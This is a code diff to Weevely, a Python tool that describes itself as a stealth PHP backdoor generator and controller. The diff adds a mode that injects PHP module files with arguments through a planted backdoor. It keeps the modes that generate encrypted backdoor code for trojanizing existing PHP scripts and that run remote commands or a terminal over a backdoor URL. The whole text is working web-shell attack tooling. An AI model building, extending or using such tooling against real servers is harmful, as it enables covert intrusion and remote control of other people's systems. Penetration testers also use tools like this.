@@ -10,7 +10,7 @@ class weevely:
     self.banner()
   
     try:
-	opts, args = getopt.getopt(sys.argv[1:], 'tgc:u:p:o:', ['generate', 'url', 'password', 'terminal', 'command', 'output'])
+	opts, args = getopt.getopt(sys.argv[1:], 'tgm:c:u:p:o:', ['module', 'generate', 'url', 'password', 'terminal', 'command', 'output'])
     except getopt.error, msg:
 	print "Error:", msg
 	exit(2)
@@ -23,6 +23,9 @@ class weevely:
 	if o in ("-c", "-command"):
 	  cmnd=a
 	  moderun='c'
+	if o in ("-m", "-module"):
+	  module=a
+	  moderun='m'
 	  
 	if o in ("-u", "-url"):
 	  url=a
@@ -40,7 +43,7 @@ class weevely:
 
     if 'moderun' in locals():
 
-      if moderun=='c' or moderun=='t':
+      if moderun=='c' or moderun=='t' or moderun=='m':
 	if 'url' not in locals():
 	  print "! Please specify URL (-u)"
 	  sys.exit(1)
@@ -59,31 +62,35 @@ class weevely:
 	  print "+ Please insert password: ",
 	  pwd = sys.stdin.readline().strip()
 
-	
-
       if moderun=='c':       
 	try:
 	  print self.execute(url, pwd, cmnd, 0)
 	except Exception, e:
 	  print '! Command execution failed: ' + str(e) + '.'
 	return
+
       if moderun=='t':
 	self.terminal(url,pwd)
       if moderun=='g':
 	self.generate(pwd,outfile)
+      if moderun=='m':
+	self.execmodule(url,pwd,module)
     else:
       self.usage()
       sys.exit(1)
 
   def usage(self):
-    print """+  Generate backdoor code in <filepath>, using <password>.
+    print """+  Generate backdoor crypted code.
 +  	./weevely -g -o <filepath> -p <password>
 +      
-+  Execute remote <command> via <url>, using <password>.
++  Command execution
 +  	./weevely -c <command> -u <url> -p <password>
 +      
-+  Execute remote terminal via <url>, using <password>.
-+  	./weevely -t -u <url> -p <password>"""
++  Terminal session
++  	./weevely -t -u <url> -p <password>
++
++  Module execution
++  	./weevely -m <module>:<firstarg>:..:<secondarg> -u <url> -p <password>"""
     
   def banner(self):
     print "+ Weevely - stealth PHP backoor generator and controller.\n+\t\t\tEmilio Pinna & Carlo Satta.\n+"
@@ -152,14 +159,32 @@ class weevely:
     
     str_tocrypt = f_tocrypt.read()
     str_crypted = self.crypt(str_tocrypt,key)
-    #print str_crypted
     str_back = f_back.read()
     new_str = str_back.replace('%%%TEXT-CRYPTED%%%', str_crypted)
     
     f_output.write(new_str)
     print '+ Backdoor file ' + path + ' created with password '+ key + '.\n+ Insert the code to trojanize an existing PHP script, or use the PHP file as is. Exiting.'
      
+  def execmodule(self, url, pwd, modulestring):
     
+    modname = modulestring.split(':')[0]
+    modargs = modulestring.split(':')[1:]
+    #print modname, modargs
+    
+    f = file('modules/' + modname + '.php')
+    modargsstring=str(modargs)
+    toinject = '$ar=Array(' + modargsstring[1:len(modargsstring)-1] + ');'
+    toinject = toinject + f.read()
+    
+    try:
+      ret = self.execute(url, pwd, toinject, 1)
+    except Exception, e:
+      print '! Backdoor verification failed: ' + str(e) + '.'
+      return
+    else:
+      print ret
+   
+  
 if __name__ == "__main__":
     
     
